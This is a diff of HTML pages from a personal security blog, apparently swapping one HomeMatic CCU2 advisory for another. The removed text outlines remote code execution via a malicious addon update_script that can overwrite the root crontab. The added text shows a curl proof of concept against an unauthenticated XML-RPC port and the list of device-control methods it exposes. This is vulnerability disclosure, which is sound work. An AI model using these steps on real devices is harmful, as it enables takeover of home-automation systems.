@@ -3,16 +3,16 @@
 	
 	<link href="//gmpg.org/xfn/11" rel="profile">
 	<meta http-equiv="content-type" content="text/html; charset=utf-8">
-	<link rel="canonical" href="http://atomic111.github.io/article/homematic-ccu2-untrusted_addon" />
+	<link rel="canonical" href="http://atomic111.github.io/article/homematic-ccu2-xml-rpc" />
 	<meta name="description" content="# Background HomeMatic is a home automation system consisting of various components for automating several parts of a building, including..." />
 	<meta property="og:description" content="# Background HomeMatic is a home automation system consisting of various components for automating several parts of a building, including..." />
 	<meta itemprop="image" content="http://atomic111.github.io/assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg" />
 	<meta property="og:image" content="http://atomic111.github.io/assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg" />
-	<meta property="og:title" content="Untrusted Addon Installation / Remote Code Execution in HomeMatic CCU2" />
+	<meta property="og:title" content="Unauthenticated XML-RPC Service in HomeMatic CCU2" />
 	<meta property="og:type" content="article" />
-	<meta property="og:url" content="http://atomic111.github.io/article/homematic-ccu2-untrusted_addon" />
+	<meta property="og:url" content="http://atomic111.github.io/article/homematic-ccu2-xml-rpc" />
 	<meta property="og:site_name" content="Patrick Münch Blog" />
-	<title>Untrusted Addon Installation / Remote Code Execution in HomeMatic CCU2 &middot; Patrick Münch Blog</title>
+	<title>Unauthenticated XML-RPC Service in HomeMatic CCU2 &middot; Patrick Münch Blog</title>
 	<meta name="mobile-web-app-capable" content="yes">
 	<meta name="HandheldFriendly" content="True" />
 	<meta name="MobileOptimized" content="320" />
@@ -70,7 +70,7 @@
 </div>
 
 	<div id="post-info" data-stellar-ratio="0.7">
-		<h1>Untrusted Addon Installation / Remote Code Execution in HomeMatic CCU2</h1>
+		<h1>Unauthenticated XML-RPC Service in HomeMatic CCU2</h1>
 		
 		<a class="site-title" href="https://twitter.com/atomiczero111"><div class="site-icon-small" style="background-image: url(https://avatars0.githubusercontent.com/u/7220740?s=400);"></div>Patrick Münch</a>, in 21 February 2018
 	</div>
@@ -91,21 +91,94 @@
 
 <h1 id="issue-description">Issue Description</h1>
 
-<p>While analyzing the implementation of the CCU2’s web interface, in particular the addon installation process and how to build own addon-packages, a remote code execution vulnerability has been identified.</p>
+<p>While analyzing the available ports of the CCU2, an open XML-RPC port without authentication has been identified. This can be exploited by sending arbitrary XML-RPC request to control the attached bidcos-devices.</p>
 
-<p>An authenticated user can upload addon packages, which contain an update_script file. This update_script file will be executed during the addon installation process. This means that an attacker can create or overwrite arbitrary files or install malicious software.</p>
+<p>The following request illustrates the problem:</p>
 
-<p>This vulnerability can be exploited in order to execute arbitrary code on the system. An attacker can for instance overwrite the <code>/usr/local/crontabs/root</code> crontab in order to reach this goal.</p>
+<p>```
+curl -v -H “Content-Type:text/xml” -d “<?xml version="1.0"?><methodcall></methodcall></p>
+<methodname>system.listMethods</methodname>
+<params />
+<p>&lt;/methodCall&gt;”
+http://192.168.2.145:2001
+```</p>
 
-<p>This can in particular be problematic if users install untrusted addons from remote sources. It might be advisable to introduce a signing scheme for trusted addons and to warn the user in case they install untrusted or unsigned addons, which could contain malicious code.</p>
+<p>The following response shows that the system successfully processed the unauthenticated request:</p>
 
-<p>Procedure:</p>
+<pre><code>HTTP/1.1 200 OK
+Server: XMLRPC++ 0.7
+Content-Type: text/xml
+Content-length: 1736
 
-<ul>
-  <li>Create a file named update_script containing malicious code</li>
-  <li>Pack the addon package</li>
-  <li>Upload the addon package via the Homematic CCU2 web interface</li>
-</ul>
+&lt;?xml version="1.0"?&gt;
+&lt;methodResponse&gt;
+  &lt;params&gt;
+    &lt;param&gt;
+      &lt;value&gt;
+        &lt;array&gt;
+          &lt;data&gt;
+            &lt;value&gt;abortDeleteDevice&lt;/value&gt;
+            &lt;value&gt;activateLinkParamset&lt;/value&gt;
+            &lt;value&gt;addDevice&lt;/value&gt;
+            &lt;value&gt;addLink&lt;/value&gt;
+            &lt;value&gt;addVirtualDeviceInstance&lt;/value&gt;
+            &lt;value&gt;changeKey&lt;/value&gt;
+            &lt;value&gt;clearConfigCache&lt;/value&gt;
+            &lt;value&gt;deleteDevice&lt;/value&gt;
+            &lt;value&gt;deleteVolatileMetadata&lt;/value&gt;
+            &lt;value&gt;determineParameter&lt;/value&gt;
+            &lt;value&gt;exit&lt;/value&gt;
+            &lt;value&gt;getAllMetadata&lt;/value&gt;
+            &lt;value&gt;getDeviceDescription&lt;/value&gt;
+            &lt;value&gt;getInstallMode&lt;/value&gt;
+            &lt;value&gt;getKeyMismatchDevice&lt;/value&gt;
+            &lt;value&gt;getLinkInfo&lt;/value&gt;
+            &lt;value&gt;getLinkPeers&lt;/value&gt;
+            &lt;value&gt;getLinks&lt;/value&gt;
+            &lt;value&gt;getMetadata&lt;/value&gt;
+            &lt;value&gt;getParamset&lt;/value&gt;
+            &lt;value&gt;getParamsetDescription&lt;/value&gt;
+            &lt;value&gt;getParamsetId&lt;/value&gt;
+            &lt;value&gt;getServiceMessages&lt;/value&gt;
+            &lt;value&gt;getValue&lt;/value&gt;
+            &lt;value&gt;getVersion&lt;/value&gt;
+            &lt;value&gt;getVolatileMetadata&lt;/value&gt;
+            &lt;value&gt;hasVolatileMetadata&lt;/value&gt;
+            &lt;value&gt;init&lt;/value&gt;
+            &lt;value&gt;listBidcosInterfaces&lt;/value&gt;
+            &lt;value&gt;listDevices&lt;/value&gt;
+            &lt;value&gt;listReplaceableDevices&lt;/value&gt;
+            &lt;value&gt;listTeams&lt;/value&gt;
+            &lt;value&gt;logLevel&lt;/value&gt;
+            &lt;value&gt;ping&lt;/value&gt;
+            &lt;value&gt;putParamset&lt;/value&gt;
+            &lt;value&gt;refreshDeployedDeviceFirmwareList&lt;/value&gt;
+            &lt;value&gt;removeLink&lt;/value&gt;
+            &lt;value&gt;replaceDevice&lt;/value&gt;
+            &lt;value&gt;reportValueUsage&lt;/value&gt;
+            &lt;value&gt;restoreConfigToDevice&lt;/value&gt;
+            &lt;value&gt;rssiInfo&lt;/value&gt;
+            &lt;value&gt;setBidcosInterface&lt;/value&gt;
+            &lt;value&gt;setInstallMode&lt;/value&gt;
+            &lt;value&gt;setInterfaceClock&lt;/value&gt;
+            &lt;value&gt;setLinkInfo&lt;/value&gt;
+            &lt;value&gt;setMetadata&lt;/value&gt;
+            &lt;value&gt;setRFLGWInfoLED&lt;/value&gt;
+            &lt;value&gt;setTeam&lt;/value&gt;
+            &lt;value&gt;setTempKey&lt;/value&gt;
+            &lt;value&gt;setValue&lt;/value&gt;
+            &lt;value&gt;setVolatileMetadata&lt;/value&gt;
+            &lt;value&gt;system.listMethods&lt;/value&gt;
+            &lt;value&gt;system.methodHelp&lt;/value&gt;
+            &lt;value&gt;updateFirmware&lt;/value&gt;
+            &lt;value&gt;system.multicall&lt;/value&gt;
+          &lt;/data&gt;
+        &lt;/array&gt;
+      &lt;/value&gt;
+    &lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodResponse&gt;
+</code></pre>
 
 <h1 id="credit">Credit</h1>
 
@@ -125,7 +198,7 @@
 		
 	
 	<script src="https://apis.google.com/js/plusone.js"></script>
-	<div id="g-comments" class="g-comments" data-href="http://atomic111.github.io/article/homematic-ccu2-untrusted_addon" data-width="700" data-first_party_property="BLOGGER" data-view_type="FILTERED_POSTMOD"></div>
+	<div id="g-comments" class="g-comments" data-href="http://atomic111.github.io/article/homematic-ccu2-xml-rpc" data-width="700" data-first_party_property="BLOGGER" data-view_type="FILTERED_POSTMOD"></div>
 	<script>
 		var width = $('#comments').width() * 0.9;
 		width = Math.round(width);
@@ -160,8 +233,8 @@
 	</div>
 	<div id="post-info" data-stellar-ratio="0.5" data-stellar-vertical-offset="120">
 		<h3>Read next</h3>
-		<a href="/article/homematic-ccu2-filewrite">
-			<h1>Arbitrary File Upload / Remote Code Execution in HomeMatic CCU2</h1>
+		<a href="/article/homematic-ccu2-fileread">
+			<h1>Directory Traversal / Arbitrary File Read in HomeMatic CCU2</h1>
 			
 				<h2></h2>
 			
